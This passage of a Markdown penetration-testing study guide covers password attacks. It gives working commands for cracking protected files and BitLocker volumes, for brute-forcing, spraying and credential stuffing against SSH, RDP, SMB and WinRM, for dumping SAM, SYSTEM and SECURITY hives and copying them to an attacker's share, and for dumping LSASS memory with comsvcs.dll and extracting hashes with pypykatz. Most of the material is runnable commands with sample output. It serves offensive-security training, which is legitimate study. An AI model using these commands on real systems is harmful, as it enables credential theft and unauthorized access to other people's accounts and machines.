| Rotate Right         | }            | Rotate the word right                                   | }                | p@ssW0rd       | dp@ssW0r               |
| Append Character     | $X           | Append character X to end                               | $1$2             | p@ssW0rd       | p@ssW0rd12             |
| Prepend Character    | ^X           | Prepend character X to front                            | ^2^1             | p@ssW0rd       | 12p@ssW0rd             |
| Truncate left        | [            | Delete first character                                  | [                | p@ssW0rd       | @ssW0rd               |
| Truncate right       | ]            | Delete last character                                   | ]                | p@ssW0rd       | p@ssW0r               |
| Delete @ N           | DN           | Delete character at position N                          | D3               | p@ssW0rd       | p@sW0rd               |
| Extract range        | xNM          | Extract M characters from position N                    | x04              | p@ssW0rd       | p@ss                  |
| Omit range           | ONM          | Delete M characters from position N                     | O12              | p@ssW0rd       | psW0rd                |
| Insert @ N           | iNX          | Insert character X at position N                        | i4!              | p@ssW0rd       | p@ss!W0rd             |
| Overwrite @ N        | oNX          | Overwrite character at position N with X                | o3$              | p@ssW0rd       | p@s$W0rd              |
| Truncate @ N         | 'N           | Truncate word at position N                             | '6               | p@ssW0rd       | p@ssW0                |
| Replace              | sXY          | Replace all instances of X with Y                       | ss$              | p@ssW0rd       | p@$$W0rd              |
| Purge                | @X           | Purge all instances of X                                | @s               | p@ssW0rd       | p@W0rd                |
| Duplicate first N    | zN           | Duplicate first character N times                       | z2               | p@ssW0rd       | ppp@ssW0rd            |
| Duplicate last N     | ZN           | Duplicate last character N times                        | Z2               | p@ssW0rd       | p@ssW0rddd            |
| Duplicate all        | q            | Duplicate every character                               | q                | p@ssW0rd       | pp@@ssssWW00rrdd      |
| Extract memory       | XNMI         | Insert substring of length M from position N of memory  | lMX428           | p@ssW0rd       | p@ssw0rdw0            |
| Append memory        | 4            | Append word saved to memory                             | uMl4             | p@ssW0rd       | p@ssw0rdP@SSW0RD      |
| Prepend memory       | 6            | Prepend word saved to memory                            | rMr6             | p@ssW0rd       | dr0Wss@pp@ssW0rd      |
| Memorize             | M            | Memorize current word                                   | lMuX084          | p@ssW0rd       | P@SSp@ssw0rdW0RD      |

Each rule is written on a new line and determines how a given word should be transformed.

```bash
cat custom.rule

# :
# c
# so0
# c so0
# sa@
# c sa@
# c sa@ so0
# $!
# $! c
# $! so0
# $! sa@
# $! c so0
# $! c sa@
# $! so0 sa@
# $! c so0 sa@
```

We can use the following command to apply the rules in custom.rule to each word in password.list and store the mutated results in mut_password.list.

```bash
hashcat --force password_list.txt -r custom.rule --stdout | sort -u > custom_password_list.txt
```

In this case, each word will produce fifteen mutated variants.

```bash
cat custom_password_list.txt

# password
# Password
# passw0rd
# Passw0rd
# p@ssword
# P@ssword
# P@ssw0rd
# password!
# Password!
# passw0rd!
# p@ssword!
# Passw0rd!
# P@ssword!
# p@ssw0rd!
# P@ssw0rd!
```

</details>

<details>
<summary><h3>Generating wordlists using CeWL</h3></summary>

We can use a tool called CeWL to scan potential words from a company's website and save them in a list. We can then combine this list with the desired rules to create a customized password list—one that has a higher probability of containing the correct password for an employee.

| **Option(s)**                     | **Argument**     | **Description**                                                  | **Default** |
|----------------------------------|------------------|------------------------------------------------------------------|-------------|
| `-h`, `--help`                   | —                | Show help.                                                       | —           |
| `-k`, `--keep`                   | —                | Keep the downloaded file.                                        | —           |
| `-d`, `--depth`                  | `<x>`            | Depth to spider to.                                              | 2           |
| `-m`, `--min_word_length`        | —                | Minimum word length.                                             | 3           |
| `-o`, `--offsite`                | —                | Let the spider visit other sites.                                | —           |
| `-w`, `--write`                  | —                | Write the output to the file.                                    | —           |
| `-u`, `--ua`                     | `<agent>`        | User agent to send.                                              | —           |
| `-n`, `--no-words`               | —                | Don't output the wordlist.                                       | —           |
| `-a`, `--meta`                   | —                | Include meta data.                                               | —           |
| `--meta_file`                    | `<file>`         | Output file for meta data.                                       | —           |
| `-e`, `--email`                  | —                | Include email addresses.                                         | —           |
| `--email_file`                   | `<file>`         | Output file for email addresses.                                 | —           |
| `--meta-temp-dir`                | `<dir>`          | Temporary dir used by exiftool when parsing files.               | `/tmp`      |
| `-c`, `--count`                  | —                | Show the count for each word found.                              | —           |
| `-v`, `--verbose`                | —                | Verbose output.                                                  | —           |
| `--debug`                        | —                | Extra debug information.                                         | —           |

**Example**

```bash
cewl https://www.domain.com -d 4 -m 6 --lowercase -w domain_wordlist.txt
```

</details>

</details>

<details>
<summary><h2>Cracking Protected Files</h2></summary>

Attempting to crack password-protected documents is often worthwhile, as they may contain sensitive information that can be leveraged to gain further access.

JtR has many different scripts for extracting hashes from files. We can find these scripts on our system using the following command:

```bash
locate *2john*
```

Besides standalone files, we will often run across archives and compressed files—such as ZIP files—which are protected with a password.

There are many types of [compressed files](https://fileinfo.com/filetypes/compressed). Some of the more commonly encountered file extensions include `tar`, `gz`, `rar`, `zip`, `vmdb/vmx`, `cpt`, `truecrypt`, `bitlocker`, `kdbx`, `deb`, `7z`, and `gzip`.

It is possible to extract all the extensions in a list using the following command:

```bash
curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

While many archive formats natively support password protection (e.g., ZIP, RAR), others like TAR require external encryption tools. Common solutions include `openssl` or `gpg`.

<details>
<summary><h3>Cracking encrypted SSH keys</h3></summary>

1. John the Ripper (JtR) includes a Python script called **ssh2john.py** to acquire the corresponding hash for an encrypted SSH key

```bash
ssh2john.py SSH.private > ssh.hash
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

3. We can then view the resulting hash

```bash
john ssh.hash --show
```

</details>

<details>
<summary><h3>Cracking password-protected Office documents</h3></summary>

1. John the Ripper (JtR) includes a Python script called **office2john.py**, which can be used to extract password hashes from all common Office (Word, Excel, PowerPoint...) document formats.

```bash
office2john.py supersecret.docx > supersecret_hash.txt
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt supersecret_hash.txt
```

3. We can then view the resulting hash

```bash
john supersecret_hash.txt --show
```

</details>

<details>
<summary><h3>Cracking password-protected PDFs</h3></summary>

1. John the Ripper (JtR) includes a Python script called **pdf2john.py**, which can be used to extract password hashes from encrypted PDF documents for offline password cracking.

```bash
pdf2john.py important_report.pdf > important_report_hash.txt
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt important_report_hash.txt
```

3. We can then view the resulting hash

```bash
john important_report_hash.txt --show
```

</details>

<details>
<summary><h3>Cracking ZIP files</h3></summary>

1. John the Ripper (JtR) includes a utility called zip2john, which extracts password hashes from encrypted ZIP archives and formats them for cracking.

```bash
zip2john files.zip > files_hash.txt
```

2. Then use JtR to try and crack it

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt files_hash.txt
```

3. We can then view the resulting hash

```bash
john files_hash.txt --show
```

</details>

<details>
<summary><h3>Cracking OpenSSL encrypted GZIP files</h3></summary>

1. To determine if a GZIP file is encrypted, we can use the following command:

```bash
file compressed_files.gzip 

# compressed_files.gzip.gzip: openssl enc'd data with salted password
```

2. To systematically attempt decryption of the file using a wordlist, execute the following one-liner:

```bash
for i in $(cat /usr/share/wordlists/rockyou.txt);do openssl enc -aes-256-cbc -d -in <FILE> -k $i 2>/dev/null| tar xz;done
```

3. You may encounter multiple GZIP decompression warnings or errors:

```bash
# ...

# gzip: stdin: not in gzip format
# tar: Child returned status 1
# tar: Error is not recoverable: exiting now

# ...
```

Once the for loop has finished, we can check the current directory for a newly extracted file.

</details>

<details>
<summary><h3>Cracking BitLocker-encrypted drives</h3></summary>

[BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/#device-encryption) is a full-disk encryption feature developed by Microsoft for the Windows operating system.

John the Ripper (JtR) includes a utility called **bitlocker2john**, which extracts [four distinct hash types](https://openwall.info/wiki/john/OpenCL-BitLocker) from BitLocker-encrypted drives: two password-based hashes for user authentication and two recovery key hashes for backup access. We will focus on cracking the password using the first hash.

1. Extract the hashes

```bash
bitlocker2john -i backup.vhd > backup_hashes.txt
```

2. Filter the line that contains the BitLocker hash

```bash
grep "bitlocker\$0" backup_hashes.txt > backup_hash.txt
```

3. Then use JtR or Hahcat to try and crack it

**Hashcat**

```bash
hashcat -a 0 -m 22100 '<BITLOCKER_HASH>' /usr/share/wordlists/rockyou.txt
```

**John**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash.txt
```

<details>
<summary><h4>Mounting BitLocker-encrypted drives in Windows</h4></summary>

The easiest method for mounting a BitLocker-encrypted virtual drive on Windows is to double-click the .vhd file. Since it is encrypted, Windows will initially show an error. After mounting, simply double-click the BitLocker volume to be prompted for the password.

</details>

<details>
<summary><h4>Mounting BitLocker-encrypted drives in Linux (or macOS)</h4></summary>

To do this, we can use a tool called [dislocker](https://github.com/Aorimn/dislocker).

1. Install the tool

```bash
sudo apt-get install dislocker
```

2. Create two folders which we will use to mount the VHD

```bash
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
```

3. Use losetup to configure the VHD as loop device

```bash
sudo losetup -f -P backup.vhd
```

4. List the devices

```bash
sudo losetup -l
```

5. List the partitions of the device

```bash
sudo fdisk -l /dev/loop0
```

6. Decrypt the drive using dislocker

```bash
sudo dislocker /dev/loop0p1 -u<PASSWORD> -- /media/bitlocker
```

7. Mount the decrypted volume

```bash
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

8. If everything was done correctly, we can now browse the files:

```bash
cd /media/bitlockermount/
ls -la
```

</details>

</details>

</details>

</details>

---

<details>
<summary><h1>📡 Remote Password Attacks</h1></summary>

During security assessments, we consistently encounter numerous network services configured with specific permissions and user assignments. These services facilitate content management, data exchange, and system administration across enterprise environments.

**Recommended Resource**

For comprehensive service enumeration techniques, refer to the [FOOTPRINTING](./01-footprinting.md) module.

<details>
<summary><h2>NetExec: A Versatile Tool</h2></summary>

NetExec serves as a powerful, modular framework for conducting password attacks and protocol-specific exploitation across network environments.

**Installing NetExec**

```bash
sudo apt-get -y install netexec
```

**NetExec Menu Options**

```bash
netexec -h
```

**NetExec Available Protocols**

* MSSQL
* WinRM
* LDAP
* SMB
* SSH
* VNC
* WMI
* FTP
* RDP

**NetExec Protocol-Specific Help**

```bash
netexec <PROTOCOL> -h
```

**NetExec Usage**

```bash
netexec <PROTOCOL> <TARGET_IP> -u <USER> -p <PASSWORD>
```

> The username and password fields can be just a string or a wordlist file.

</details>

<details>
<summary><h2>Network Services</h2></summary>

<details>
<summary><h3>WinRM</h3></summary>

[WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/portal) is Microsoft's implementation of the [WS-Management protocol](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol), providing a standardized framework for remote Windows system administration.

<!-- 
**1. Functional Capabilities**

* Remote command execution

* System configuration management

* Real-time performance monitoring

**2. Authentication Methods**

* Basic

* NTLM

* Kerberos

* Certificate-based

**3. Security Considerations**

* Often misconfigured with excessive privileges

* Common target for lateral movement attacks

* Requires proper certificate management for HTTPS implementations

A handy tool that we can use to communicate with the WinRM service is Evil-WinRM, which allows us to communicate with the WinRM service efficiently.
 -->

**CrackMapExec**

Brute Force Login

```bash
crackmapexec winrm <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST> -q
```

**Evil-WinRM**

Install

```bash
sudo gem install evil-winrm
```

Usage

```bash
evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>
```

Expected output

```bash
# Evil-WinRM shell v3.3

# Info: Establishing connection to remote endpoint

# *Evil-WinRM* PS C:\Users\user\Documents>
```

> **NOTE:** If the login was successful, a terminal session is initialized using the Powershell Remoting Protocol (MS-PSRP), which simplifies the operation and execution of commands.

</details>

<details>
<summary><h3>SSH</h3></summary>

<!-- Secure Shell (SSH) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The protocol implements three cryptographic primitives:

1. Symmetric Encryption

    * Uses shared secret keys (AES-256, ChaCha20, etc.) for session encryption

    * Implements Ephemeral Diffie-Hellman for secure key exchange

    * Key characteristics:

        * 128-512 bit keys (configurable)

        * Encrypts all subsequent communications

        * Common ciphers: AES-GCM, Blowfish, 3DES (deprecated)

2. Asymmetric Encryption

    * Leverages key pairs (RSA/ECDSA/Ed25519) for:

        * Host authentication

        * Key exchange initialization

    * Critical security considerations

        * Private keys should always be passphrase-protected

        * Default key locations (`~/.ssh/id_rsa`) are common attack targets

3. Hashing (HMAC)

    * Verifies message integrity via SHA-2/SHA-3 algorithms

    * Prevents replay attacks and tampering -->

We can use a tool like **Hydra** to brute force SSH. This is covered in-depth in the [LOGIN BRUTE FORCING](./13-login-brute-forcing.md) module.

**Hydra - SSH**

Brute force SSH

```bash
hydra -L <USER_LIST> -P <PASSWORD_LIST> ssh://<TARGET_IP>
```

Log in to the system via SSH

```bash
ssh <USER>@<TARGET_IP>
```

> The username and password fields can be just a string or a wordlist file.

</details>

<details>
<summary><h3>Remote Desktop Protocol (RDP)</h3></summary>

[Microsoft's Remote Desktop Protocol](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) (RDP) is a network protocol that allows remote access to Windows systems via TCP port 3389 by default.

**Hydra - RDP**

```bash
hydra -L <USER_LIST> -P <PASSWORD_LIST> rdp://<TARGET_IP>
```

> The username and password fields can be just a string or a wordlist file.

Log in to the system via xFreeRDP

```bash
xfreerdp /v:<TARGET_IP> /u:'<USER>' /p:'<PASSWORD>'
```

</details>

<details>
<summary><h3>SMB</h3></summary>

[Server Message Block](https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview) (SMB) is a protocol responsible for transferring data between a client and a server in local area networks.

1. Brute Force Credentials

**Hydra - SMB**

```bash
hydra -L <USER_LIST> -P <PASSWORD_LIST> -V <TARGET_IP> smb
```

> The username and password fields can be just a string or a wordlist file.

**OPTION 1: CrackMapExec - SMB**

```bash
crackmapexec smb <TARGET_IP> -u <USER_LIST> -p <PASSWORD_LIST>
```

> The username and password fields can be just a string or a wordlist file.

**OPTION 2: Metaploit - SMB**

```bash
sudo msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 > options
msf6 > set USER_FILE <USER_LIST>
msf6 > set PASS_FILE <PASSWORD_LIST>
msf6 > set RHOSTS <TARGET_IP>
msf6 > set STOP_ON_SUCCESS true
msf6 > set CreateSession true

msf6 > run
```

If valid credentials credentials were found, a session is created

```bash
msf6 > sessions

msf6 > sessions -i <SESSION_ID>

SMB (<TARGET_IP>) > shares

SMB (<TARGET_IP>) > shares -i <SHARE_ID>
```


2. List Shares

We can use NetExec to view the available shares and what privileges we have for them.

```bash
netexec smb <TARGET_IP> -u "<USER>" -p "<PASSWORD>" --shares
```

3. Log in to the system via Smbclient

```bash
smbclient -U <USER> \\\\<TARGET_IP>\\<SHARENAME>
```

</details>

</details>

<details>
<summary><h2>Spraying, Stuffing, and Defaults</h2></summary>

<details>
<summary><h3>Password spraying</h3></summary>

Password spraying is a credential-based attack where a single password is tested against multiple user accounts before moving to the next password. 

This technique:

* Avoids account lockouts by spacing attempts

* Exploits weak organizational password policies

* Targets default/initial passwords (e.g., CompanyName123, Welcome1)

High-risk scenarios:

* Default credentials in onboarding processes  

* Password reuse across departments  

* Lack of multi-factor authentication (MFA)

| Target Environment       | Recommended Tools                          | Protocol/Port Focus        |
|--------------------------|--------------------------------------------|---------------------------|
| Web Applications         | Burp Suite Intruder, OWASP ZAP             | HTTP/HTTPS (80, 443)      |
| Active Directory         | NetExec, Kerbrute                          | LDAP/SMB (389, 445)       |
| Cloud Services           | MSOLSpray, Okta API scripts                | REST APIs (443)           |
| Legacy Systems           | Hydra, Metasploit auxiliary modules        | SSH/RDP (22, 3389)        |

**Example**

```bash
netexec smb 10.100.38.0/24 -u <USERNAMES> -p 'Corp1234'
```

</details>

<details>
<summary><h3>Credential stuffing</h3></summary>

Credential stuffing leverages compromised credentials from one service to gain unauthorized access to unrelated systems, exploiting widespread password reuse across platforms (email, SaaS, enterprise systems).

```bash
hydra -C user_pass_list.txt ssh://<TARGET_IP> -t 4 -W 5
```

</details>

<details>
<summary><h3>Default credentials</h3></summary>

Network infrastructure devices and enterprise software frequently ship with factory-set credentials, creating critical exposure when left unmodified during deployment.

While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet).

Install

```bash
pip3 install defaultcreds-cheat-sheet
```

Once installed, we can use the creds command to search for known default credentials associated with a specific product or vendor.

```bash
creds search <KEYWORD>
```

Example:

```bash
creds search linksys --export

# +---------------+---------------+------------+
# | Product       |    username   |  password  |
# +---------------+---------------+------------+
# | linksys       |    <blank>    |  <blank>   |
# | linksys       |    <blank>    |   admin    |
# | linksys       |    <blank>    | epicrouter |
# | linksys       | Administrator |   admin    |
# | linksys       |     admin     |  <blank>   |
# | linksys       |     admin     |   admin    |
# | linksys       |    comcast    |    1234    |
# | linksys       |      root     |  orion99   |
# | linksys       |      user     |  tivonpw   |
# | linksys (ssh) |     admin     |   admin    |
# | linksys (ssh) |     admin     |  password  |
# | linksys (ssh) |    linksys    |  <blank>   |
# | linksys (ssh) |      root     |   admin    |
# +---------------+---------------+------------+

# [+] Creds saved to /tmp/linksys-usernames.txt , /tmp/linksys-passwords.txt 📥
```


</details>

</details>

</details>

</details>

---

<details>
<summary><h1>🪟 Extracting Passwords from Windows Systems</h1></summary>

<details>
<summary><h2>Attacking SAM, SYSTEM, and AUTHORITY</h2></summary>

With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. Performing this process offline allows us to continue our attacks without having to maintain an active session with the target.

<details>
<summary><h3>Registry Hives</h3></summary>

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.

| Registry Hive   | Description |
|----------------|-------------|
| `HKLM\SAM`     | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords. |
| `HKLM\SYSTEM`  | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes. |
| `HKLM\SECURITY`| Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |

</details>

1. **Use reg.exe to save copies of the registry hives *(requires launching cmd.exe with administrative privileges)***

    **Target Machine:** Save the contents of the HKLM\SAM registry hive to a file named 'sam.save'

    ```cmd
    reg.exe save hklm\sam %USERPROFILE%\Desktop\sam.save
    ```

    **Target Machine:** Save the contents of the HKLM\SYSTEM registry hive to a file named 'system.save'

    ```cmd
    reg.exe save hklm\system %USERPROFILE%\Desktop\system.save
    ```

    **Target Machine:** Save the contents of the HKLM\SECURITY registry hive to a file named 'security.save'

    ```cmd
    reg.exe save hklm\security %USERPROFILE%\Desktop\security.save
    ```

    After saving the registry hives offline, we can transfer them to our attack host using several methods. In this example, we'll use Impacket's smbserver along with basic CMD commands to copy the hive files to a shared folder hosted on the attacker machine.

2. Transfer the files from the target machine to the attack machine

    **Attack Machine:** Create a share with smbserver

    ```bash
    mkdir ~/winhives
    sudo smbserver.py -smb2support share ~/winhives
    ```

    **Target Machine:** Transfer the hive copies to the share

    ```bash
    C:\> move sam.save \\<ATTACKER_IP>\share
    ```

    ```bash
    C:\> move security.save \\<ATTACKER_IP>\share
    ```

    ```bash
    C:\> move system.save \\<ATTACKER_IP>\share
    ```

3. **Dump the hashes with secretsdump**

    **Attack Machine:** Run [`secretsdump.py`](../scripts/passwords/secretsdump.py) with Python and specify each of the hive files we retrieved from the target host.

    ```bash
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    ```

    Notice the following line:

    ```bash
    # Dumping local SAM hashes (uid:rid:lmhash:nthash)
    ```

    This tells us how to interpret the output and which hashes we can attempt to crack. 
    
    With this in mind, we can extract the NT hashes for each user account into a text file and begin the password cracking process. Keeping track of which hash belongs to which user is helpful for organizing and interpreting the results.

    > **NOTE:** The first step secretsdump performs is retrieving the system bootkey, which is required to decrypt the local SAM hashes. This is because the bootkey is used to encrypt and decrypt the SAM database. Without access to it, the hashes cannot be decrypted—making it essential to have copies of the relevant registry hives, as previously discussed.

4. **Crack the hashes with Hashcat**

    **Attack Machine:** Populate a text file with the NT hashes we were able to dump

    ```bash
    cat windowshashes.txt

    31d6cfe0d16ae931b73c59d7e0c089c0
    c02478537b9727d391bc80011c2e2321
    58a478135a93ac3bf058a5ea0e8fdb71
    ```

    **Attack Machine:** Run Hashcat against NT hashes

    ```bash
    sudo hashcat -m 1000 windowshashes.txt /usr/share/wordlists/rockyou.txt
    ```

    Obtaining these passwords can be valuable in several ways. For instance, the cracked credentials might allow us to access other systems on the network—especially since password reuse across different work or personal accounts is common. Understanding and applying this technique is particularly useful during assessments and can be leveraged whenever we compromise a vulnerable Windows system and obtain administrative privileges to dump the SAM database.

<details>
<summary><h3>DCC2 hashes</h3></summary>

As previously mentioned, `HKLM\SECURITY` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed representations of network credentials. 

**Example hash**

```
exampledomain.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

**Run Hashcat against NT hashes**

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

</details>

<details>
<summary><h3>DPAPI</h3></summary>

The Data Protection Application Programming Interface (DPAPI) is a set of Windows APIs used to encrypt and decrypt data blobs on a per-user basis. These encrypted blobs are employed by various Windows features and third-party applications to securely store sensitive information.

| Applications              | Use of DPAPI                                                                                   |
|--------------------------|------------------------------------------------------------------------------------------------|
| Internet Explorer        | Password form auto-completion data (username and password for saved sites).                    |
| Google Chrome            | Password form auto-completion data (username and password for saved sites).                    |
| Outlook                  | Passwords for email accounts.                                                                  |
| Remote Desktop Connection| Saved credentials for connections to remote machines.                                          |
| Credential Manager       | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.    |

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/ParrotSec/mimikatz/tree/master), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).

<!-- TODO: ADD EXAMPLES  -->

</details>

<details>
<summary><h3>Remote dumping & LSA secrets considerations</h3></summary>

With credentials that have local administrator privileges, it's also possible to target LSA secrets remotely. This can enable the extraction of credentials stored by running services, scheduled tasks, or applications that save passwords using LSA secrets.

**Dumping LSA secrets remotely**

```bash
netexec smb <TARGET IP> --local-auth -u <USERNAME> -p <PASSWORD> --lsa
```

**Dumping SAM Remotely**

```bash
netexec smb <TARGET IP> --local-auth -u <USERNAME> -p <PASSWORD> --sam
```

</details>

</details>

<details>
<summary><h2>Attacking LSASS</h2></summary>

In addition to obtaining copies of the SAM database for password hash extraction and cracking, we can also benefit from targeting the [Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (LSASS). As discussed in the Credential Storage section of this module, LSASS is a core Windows process responsible for enforcing security policies, managing user authentication, and storing sensitive credential material in memory.

Upon initial logon, LSASS will:

* Cache credentials locally in memory
* Create [access tokens](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
* Enforce security policies
* Write to Windows' [security log](https://learn.microsoft.com/en-us/windows/win32/eventlog/event-logging-security)

Before extracting credentials from LSASS, it's wise to first create a memory dump of the LSASS process. This allows us to analyze its contents offline from our attack host. Performing the attack offline provides greater flexibility—enabling faster processing and reducing the time spent on the target system, which helps minimize detection risk.

<details>
<summary><h4>Dumping LSASS process memory</h4></summary>

<details>
<summary><h5>Task Manager method</h5></summary>

With access to an interactive graphical session on the target, we can use task manager to create a memory dump. This requires us to:

1. Open Task Manager
2. Select the Processes tab
3. Find and right click the Local Security Authority Process
4. Select Create dump file
5. A file called `lsass.DMP` is created and saved in `%temp%`.

This is the file we will transfer to our attack host. 

</details>

<details>
<summary><h5>Rundll32.exe & Comsvcs.dll method</h5></summary>

The Task Manager method for dumping LSASS memory requires a GUI-based interactive session with the target, which isn't always available. As an alternative, we can use the command-line utility `rundll32.exe` to dump LSASS memory.

> **NOTE:** Modern antivirus solutions typically flag this technique as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to `lsass.exe`. This can be done from cmd or PowerShell:

**Finding LSASS's PID in cmd**

```cmd
tasklist /svc
```

Expected output

```cmd
Image Name                     PID Services
========================= ======== ============================================
...
lsass.exe                      672 KeyIso, SamSs, VaultSvc
...
```

**Finding LSASS's PID in PowerShell**

```powershell
Get-Process lsass
```

Expected output

```cmd
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

**Creating a dump file using PowerShell *(with an elevated PowerShell session)***

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

With this command, we are running `rundll32.exe` to call an exported function of `comsvcs.dll` which also calls the MiniDumpWriteDump (`MiniDump`) function to dump the LSASS process memory to a specified directory (`C:\lsass.dmp`). 

If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack host to attempt to extract any credentials that may have been stored in LSASS process memory.

</details>

</details>

<details>
<summary><h4>Using Pypykatz to extract credentials</h4></summary>

Once the dump file is transferred to our attack host, we can use a powerful tool called [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials directly from the .dmp file.

**Install**

```bash
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
sudo python3 setup.py install
```

At the time of writing, Mimikatz only runs on Windows systems. This means we’d either need a Windows-based attack host or run Mimikatz directly on the target—an approach that carries greater risk. In contrast, pypykatz offers a more convenient and stealthy alternative, as it can be run offline on a Linux-based attack host using just a copy of the dump file.

When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present.

**Running Pypykatz**

```bash
pypykatz lsa minidump ./lsass.DMP
```

**Output**

MSV

```bash
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```

[MSV](https://learn.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that the Local Security Authority (LSA) uses to validate logon attempts against the SAM database. In this case, pypykatz extracted details from the `bob` user account's logon session stored in LSASS memory—including the SID, username, domain, and both the NT and SHA1 password hashes.

WDIGEST

```bash
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
```

WDIGEST is an older authentication protocol that was enabled by default in Windows XP through Windows 8, as well as Windows Server 2003 through 2012. When enabled, LSASS caches WDIGEST credentials in **clear-text**, meaning that if we target a system with WDIGEST active, there's a high chance of retrieving a plaintext password. However, in modern Windows versions, WDIGEST is **disabled by default** to mitigate this risk.

Kerberos

```bash
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

[Kerberos](https://web.mit.edu/kerberos/#what_is) is a network authentication protocol used by **Active Directory** in Windows domain environments. When a domain user authenticates, they are issued tickets that allow access to authorized network resources without re-entering credentials. LSASS stores Kerberos-related data such as passwords, encryption keys (ekeys), tickets, and PINs in memory. This makes it possible to extract these artifacts from LSASS and use them to access other systems within the same domain.

DPAPI

```bash
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

Mimikatz and pypykatz can extract DPAPI master keys for logged-on users whose data resides in LSASS process memory. These master keys can then be used to decrypt secrets stored by various applications that rely on DPAPI, potentially revealing credentials for multiple accounts. DPAPI attack techniques are explored in greater depth in the [WINDOWS PRIVILEGE ESCALATION](./23-windows-privilege-escalation.md) module.

**Cracking the NT Hash with Hashcat**

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

</details>

</details>

<details>
<summary><h2>Attacking Windows Credential Manager</h2></summary>

Introduced in Windows 7/Server 2008 R2, Credential Manager serves as a proprietary vault for storing authentication details (domain, web, and application credentials) in encrypted form. While Microsoft's internal workings remain undocumented, research reveals credentials are stored in protected locations:

* `%USERPROFILE%\AppData\Local\Microsoft\Vault\`
* `%USERPROFILE%\AppData\Local\Microsoft\Credentials\`
* `%USERPROFILE%\AppData\Roaming\Microsoft\Vault\`
* `%ProgramData%\Microsoft\Vault\`
* `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\`

Each vault folder contains a Policy.vpol file with AES keys (AES-128 or AES-256) that is protected by DPAPI. These AES keys are used to encrypt the credentials. Newer versions of Windows make use of Credential Guard to further protect the DPAPI master keys by storing them in secured memory enclaves ([Virtualization-based Security](https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)).

<details>
<summary><h3>Windows Vault and Credential Manager</h3></summary>

Microsoft often refers to the protected credential stores as Credential Lockers (previously known as Windows Vaults). While Credential Manager serves as the user-facing interface and API, the actual credentials are stored in encrypted vault or locker folders on the system.The following table lists the two types of credentials Windows stores:

| Name                | Description |
|---------------------|-------------|
| **Web Credentials** | Credentials associated with websites and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge. |
| **Windows Credentials** | Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories. |

**Exporting credentials**

